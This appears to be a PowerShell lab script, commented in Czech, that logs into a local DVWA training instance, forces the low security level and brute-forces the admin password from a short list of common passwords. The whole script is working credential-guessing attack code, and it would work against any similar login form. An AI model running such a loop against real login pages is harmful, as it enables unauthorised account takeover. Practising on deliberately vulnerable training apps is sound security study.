# Konfigurace - upravte dle vašeho nastavení DVWA
$baseUrl = "http://localhost/dvwa"
$loginUrl = "$baseUrl/login.php"
$bruteUrl = "$baseUrl/vulnerabilities/brute/"

# Přihlašovací údaje do DVWA (pro získání session)
$adminUser = "admin"
$adminPass = "password"

# Cílový účet pro útok a slovník hesel
$targetUser = "admin"
$passwordList = @("123456", "dragon", "admin", "password", "letmein")

# 1. Získání úvodní session a tokenů
$response = Invoke-WebRequest -Uri $loginUrl -SessionVariable dvwaSession

# 2. Provedení přihlášení (Form Login)
$form = $response.Forms[0]
$form.Fields["username"] = $adminUser
$form.Fields["password"] = $adminPass
$form.Fields["Login"] = "Login"

# Odeslání přihlašovacích údajů
Invoke-WebRequest -Uri "$baseUrl/login.php" -Method Post -Body $form.Fields -WebSession $dvwaSession | Out-Null

# 3. Vynucení obtížnosti LOW (přidání cookie do session)
# Je nutné specifikovat doménu (localhost), jinak cookie nebude odeslána
$cookie = New-Object System.Net.Cookie("security", "low", "/", "localhost")
$dvwaSession.Cookies.Add($cookie)

# 4. Simulace útoku hrubou silou
Write-Host "Zahajuji útok na uživatele '$targetUser'..." -ForegroundColor Cyan

foreach ($pass in $passwordList) {
    # DVWA Brute Force modul využívá GET request s parametry v URL
    $attackUri = "$bruteUrl?username=$targetUser&password=$pass&Login=Login"
    
    # Odeslání požadavku s existující session (vč. cookies)
    $result = Invoke-WebRequest -Uri $attackUri -WebSession $dvwaSession
    
    # Analýza odpovědi - hledáme text indikující neúspěch
    # V DVWA "Username and/or password incorrect." znamená chybu.
    if ($result.Content -notmatch "Username and/or password incorrect") {
        Write-Host "[ÚSPĚCH] Heslo nalezeno: $pass" -ForegroundColor Green
        break
    }
    else {
        Write-Host "[CHYBA] Heslo '$pass' není správné." -ForegroundColor Gray
    }
}
